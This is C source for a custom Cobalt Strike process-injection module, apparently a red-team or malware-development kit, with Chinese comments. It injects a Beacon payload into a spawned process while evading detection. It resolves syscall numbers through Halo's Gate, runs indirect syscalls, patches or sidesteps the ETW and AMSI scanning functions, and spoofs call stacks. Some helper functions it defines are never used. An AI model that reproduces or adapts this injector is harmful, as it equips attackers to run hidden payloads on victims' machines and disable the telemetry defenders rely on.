/*
 * cs_dev :: injector.x64  (Process Inject Kit v2)
 * ---------------------------------------------------------------------------
 * Cobalt Strike 4.x 自定义注入器 -- 间接系统调用 + 遥测阻断
 *
 * ABI (与官方 sleeve/injector.x64.o 一致):
 *     void go(char * payload, int length, int isX86);   // rcx, edx, r8d
 *     CS 通过 GoX86/GoX64 (r8d = 1/0) 分派, 并导出 is_x64() 供 Beacon 查询
 *
 * 相对官方原版的增强:
 *   1. 间接系统调用 (Indirect Syscall)
 *      - 运行时从 ntdll stub 解析 SSN, 不硬编码 (兼容各 Windows 版本)
 *      - stub 被 hook 时启用 Halo's Gate: 扫描相邻 stub 反推 SSN
 *      - 在本地一次性分配的缓冲区内生成 syscall 跳板, 之后改权为 RX
 *      - 内存分配/写入/改权/建线程全部走 syscall, 绕过 EDR 的用户态挂钩
 *   2. 遥测阻断: EtwEventWrite 与 AmsiScanBuffer 单字节 ret 补丁
 *   3. 目标进程侧两段式 RW -> RX, 全流程不出现 PAGE_EXECUTE_READWRITE
 *   4. x64 未文档化调用 NtCreateThreadEx 建线程, 失败回退 Win32
 *   5. 临时进程来源保持官方契约 (BeaconSpawnTemporaryProcess/CleanupProcess)
 * ---------------------------------------------------------------------------
 */
#include <windows.h>

/* --- CS Beacon API ----------------------------------------------------- */
DECLSPEC_IMPORT void  BeaconPrintf(int type, char *fmt, ...);
DECLSPEC_IMPORT void  BeaconErrorD(int type, DWORD code);
DECLSPEC_IMPORT void  BeaconErrorDD(int type, DWORD code, DWORD code2);
DECLSPEC_IMPORT BOOL  BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFOA *si, PROCESS_INFORMATION *pi);
DECLSPEC_IMPORT void  BeaconCleanupProcess(PROCESS_INFORMATION *pi);

/* --- 最小 Win32 (用于 stub 缓冲区与遥测补丁) --------------------------- */
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
/* Win32 回退路径 (档案 basic / 或 syscall 解析失败时使用) */
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(VOID);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$IsWow64Process(HANDLE, PBOOL);

/* ======================================================================
 * 编译期免杀档案开关 (由 tools/gen_profile.ps1 通过 -D 注入)
 *
 *   CS_DEV_LEGACY_PATCH     遥测绕过改用传统内存 patch (默认 patchless)
 *   CS_DEV_NO_RECYCLEDGATE  native API 走 Win32 (默认 RecycledGate syscall)
 *   CS_DEV_NO_STACKSPOOF    关闭调用栈伪造 (默认启用)
 *   CS_DEV_NO_HEADER_WIPE   UDRL 不擦除原始镜像头 (兼容性优先)
 * ==================================================================== */
#ifdef CS_DEV_NO_RECYCLEDGATE
  #define CS_USE_SYSCALL 0
#else
  #define CS_USE_SYSCALL 1
#endif

#ifdef CS_DEV_NO_STACKSPOOF
  #define CS_USE_STACKSPOOF 0
#else
  #define CS_USE_STACKSPOOF 1
#endif

/* ======================================================================
 * 1. SSN 解析 (动态, 不硬编码)
 * ==================================================================== */
static DWORD resolve_ssn(void *fn) {
    BYTE *p = (BYTE *)fn;
    int   i;

    if (!p) return 0;
    /* 未挂钩形态: mov r10, rcx ; mov eax, SSN */
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8)
        return *(DWORD *)(p + 4);

    /* Halo's Gate: 向两侧扫描邻居 stub, 用邻居 SSN 与索引差反推 */
    for (i = 1; i < 64; i++) {
        BYTE *up = p - i * 32;
        BYTE *dn = p + i * 32;
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8)
            return *(DWORD *)(up + 4) + (DWORD)i;
        if (dn[0] == 0x4C && dn[1] == 0x8B && dn[2] == 0xD1 && dn[3] == 0xB8)
            return *(DWORD *)(dn + 4) - (DWORD)i;
    }
    return 0;
}

/* ======================================================================
 * 2. syscall 跳板池 (局部生成, 一次性分配)
 * ==================================================================== */
static BYTE *g_pool = NULL;
static DWORD g_used = 0;

static void *make_stub(DWORD ssn) {
    BYTE *p;
    DWORD old = 0;

    if (!ssn) return NULL;

    if (!g_pool) {
        g_pool = (BYTE *)KERNEL32$VirtualAlloc(NULL, 4096,
                                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!g_pool) return NULL;
    }
    if (g_used + 16 > 4096) return NULL;

    p = g_pool + g_used;
    g_used += 16;

    p[0] = 0x4C; p[1] = 0x8B; p[2] = 0xD1;      /* mov r10, rcx       */
    p[3] = 0xB8;                                 /* mov eax, imm32     */
    *(DWORD *)(p + 4) = ssn;
    p[8] = 0x0F; p[9] = 0x05;                    /* syscall            */
    p[10] = 0xC3;                                /* ret                */
    /* 其余字节留 0x90 填充, 便于阅读反汇编时的边界 */
    p[11] = 0x90; p[12] = 0x90; p[13] = 0x90; p[14] = 0x90; p[15] = 0x90;

    KERNEL32$VirtualProtect(g_pool, 4096, PAGE_EXECUTE_READ, &old);
    return p;
}

static void *nt_stub(const char *name) {
    static HMODULE ntdll = NULL;
    void *fn;
    if (!ntdll) ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!ntdll) return NULL;
    fn = (void *)KERNEL32$GetProcAddress(ntdll, name);
    if (!fn) return NULL;
    return make_stub(resolve_ssn(fn));
}

/* ======================================================================
 * 3. 遥测阻断
 *
 *    默认使用 patchless 方案 (硬件断点 DR0..DR3 + VEH): 内存零改动,
 *    可对抗基于内存完整性校验 / 磁盘副本比对 / 首字节特征扫描的检测.
 *    定义 CS_DEV_LEGACY_PATCH 可回退传统内存 patch.
 * ==================================================================== */
#include "../evasion/hwbp.h"
#include "../evasion/evasion.h"

static void patch_ret(void *target) {
    DWORD old = 0;
    if (!target) return;
    if (KERNEL32$VirtualProtect(target, 1, PAGE_EXECUTE_READWRITE, &old)) {
        *(volatile BYTE *)target = 0xC3;
        KERNEL32$VirtualProtect(target, 1, old, &old);
    }
}

static void blind_telemetry(void) {
#ifdef CS_DEV_LEGACY_PATCH
    HMODULE ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    HMODULE amsi  = KERNEL32$GetModuleHandleA("amsi.dll");
    if (ntdll) patch_ret((void *)KERNEL32$GetProcAddress(ntdll, "EtwEventWrite"));
    if (amsi)  patch_ret((void *)KERNEL32$GetProcAddress(amsi, "AmsiScanBuffer"));
#else
    /* patchless: 硬件断点 + VEH, 不写入任何指令字节 */
    install_patchless_bypass();
#endif
}

/* ======================================================================
 * 4. Native API 原型 (x64 调用约定)
 * ==================================================================== */
typedef LONG (WINAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef LONG (WINAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef LONG (WINAPI *pNtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef LONG (WINAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

/* ======================================================================
 * 5. 注入主体
 * ==================================================================== */
static BOOL inject_remote(HANDLE hProc, char *payload, int len) {
    PVOID  remote = NULL;
    SIZE_T size   = (SIZE_T)len;
    SIZE_T written = 0;
    HANDLE hThread = NULL;
    void  *fSys = (void *)cs_syscall_hop;   /* 统一入口, SSN 由全局槽位提供 */
    int    viaSyscall = 0;

    if (CS_USE_SYSCALL) {
        cs_evasion_init();
        cs_spoof_init();
    }

    /* --- 1. 目标进程内分配 RW --- */
    if (CS_USE_SYSCALL && cs_prepare_syscall("NtAllocateVirtualMemory")) {
        typedef LONG (WINAPI *tAlloc)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
        if (((tAlloc)fSys)(hProc, &remote, 0, &size,
                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0 || !remote) {
            BeaconErrorD(0x0e, KERNEL32$GetLastError());
            return FALSE;
        }
        viaSyscall = 1;
    } else {
        remote = KERNEL32$VirtualAllocEx(hProc, NULL, (SIZE_T)len,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remote) {
            BeaconErrorD(0x0e, KERNEL32$GetLastError());
            return FALSE;
        }
    }

    /* --- 2. 写入 payload --- */
    if (viaSyscall && cs_prepare_syscall("NtWriteVirtualMemory")) {
        typedef LONG (WINAPI *tWrite)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        if (((tWrite)fSys)(hProc, remote, payload, (SIZE_T)len, &written) != 0
            || written != (SIZE_T)len) {
            BeaconErrorD(0x0e, KERNEL32$GetLastError());
            return FALSE;
        }
    } else {
        if (!KERNEL32$WriteProcessMemory(hProc, remote, payload, (SIZE_T)len, &written)
            || written != (SIZE_T)len) {
            BeaconErrorD(0x0e, KERNEL32$GetLastError());
            return FALSE;
        }
    }

    /* --- 3. 改权 RX (无 RWX) --- */
    if (viaSyscall && cs_prepare_syscall("NtProtectVirtualMemory")) {
        typedef LONG (WINAPI *tProt)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
        PVOID base = remote;
        SIZE_T sz  = (SIZE_T)len;
        ULONG  o2  = 0;
        ((tProt)fSys)(hProc, &base, &sz, PAGE_EXECUTE_READ, &o2);
    } else {
        DWORD o2 = 0;
        KERNEL32$VirtualProtectEx(hProc, remote, (SIZE_T)len, PAGE_EXECUTE_READ, &o2);
    }

    /* --- 4. 建线程: syscall 优先, 回退 Win32 --- */
    if (viaSyscall && cs_prepare_syscall("NtCreateThreadEx")) {
        typedef LONG (WINAPI *tThr)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
                                    PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
        if (((tThr)fSys)(&hThread, 0x1FFFFF, NULL, hProc, remote, NULL, 0, 0, 0, 0, NULL) != 0)
            hThread = NULL;
    }
    if (!hThread) {
        hThread = KERNEL32$CreateRemoteThread(hProc, NULL, 0,
                                              (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    }
    if (!hThread) {
        BeaconErrorDD(0x0e, KERNEL32$GetLastError(), 0);
        return FALSE;
    }

    /* --- 5. 关闭句柄 ---
     * CS_USE_STACKSPOOF 时经合法模块内的 jmp rbx gadget 转发, 使该次调用的
     * 栈顶返回地址落在系统模块镜像内; 否则走常规 Win32 调用 */
    if (CS_USE_STACKSPOOF && viaSyscall && cs_prepare_syscall("NtClose") && g_hop_gadget) {
        cs_call_spoofed(fSys, (e_u64)hThread, 0, 0);
    } else {
        KERNEL32$CloseHandle(hThread);
    }

    return TRUE;
}

/* ======================================================================
 * 6. 导出符号
 * ==================================================================== */
int is_x64(void) {
#if defined(_WIN64)
    return 1;
#else
    return 0;
#endif
}

void go(char *payload, int length, int isX86) {
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    DWORD               i;

    if (!payload || length <= 0) return;

    /* 注入前熄灯 */
    blind_telemetry();

    for (i = 0; i < sizeof(si); i++) ((BYTE *)&si)[i] = 0;
    for (i = 0; i < sizeof(pi); i++) ((BYTE *)&pi)[i] = 0;
    si.cb = sizeof(si);

#if defined(_WIN64)
    if (isX86) {
        BeaconPrintf(0x0e, "This command cannot inject from x86 -> x64 (it's a special case)");
        return;
    }
#endif

    if (!BeaconSpawnTemporaryProcess(isX86, FALSE, &si, &pi)) {
        BeaconPrintf(0x0e, "Unable to spawn %s temporary process.", isX86 ? "x86" : "x64");
        return;
    }

    if (!inject_remote(pi.hProcess, payload, length))
        BeaconPrintf(0x0e, "Unable to create thread in temporary process.");

    BeaconCleanupProcess(&pi);
}

void GoX86(char *payload, int length) { go(payload, length, 1); }
void GoX64(char *payload, int length) { go(payload, length, 0); }
